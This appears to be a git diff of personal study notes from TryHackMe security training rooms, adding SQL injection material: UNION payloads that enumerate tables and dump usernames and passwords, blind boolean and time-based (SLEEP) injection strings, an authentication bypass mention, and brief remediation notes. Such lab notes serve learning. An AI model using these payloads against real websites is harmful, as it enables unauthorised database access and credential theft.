@@ -289,6 +289,7 @@ toto
 # Notes
 
 * https://tryhackme.com/resources/blog/online-training-for-careers
+* https://tryhackme.com/resources/blog/cyber-security-awareness-month
 
 <hr class="sep-both">
 
@@ -320,7 +321,7 @@ toto
 ## SQLi
 
 * https://tryhackme.com/room/sqlinjectionlm
-* UNION: same type too!
+* UNION: same "type" too / not for SQL, but for the website
 * `'` to discover if an attack is possible
 * `';-- -`
 * `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`: `article,staff_users`
@@ -328,3 +329,15 @@ toto
 * `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`
 * `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`
 * In-Band (error+union): same channel
+* Blind SQLi (boolean-based / Authentication Bypass=we use it to login without password)
+* `where database() like '%';--`
+* `FROM information_schema.tables WHERE table_schema = 'xxx' and table_name like 'a%';--`
+* `FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='xxx' and TABLE_NAME='yyy' and COLUMN_NAME like '%';`. If multiple results, add a condition "COLUMN_NAME !='id'"
+* admin123' UNION SELECT SLEEP(5);-- 
+* If there was no pause in the response time, we know that the query was unsuccessful
+* and length(table_name) =19
+* analytics_referrers
+* Out-of-band
+* Remediations
+  * Input Validation (remove invalid stuff?)
+  * Escaping User Input (escape invalid stuff?)
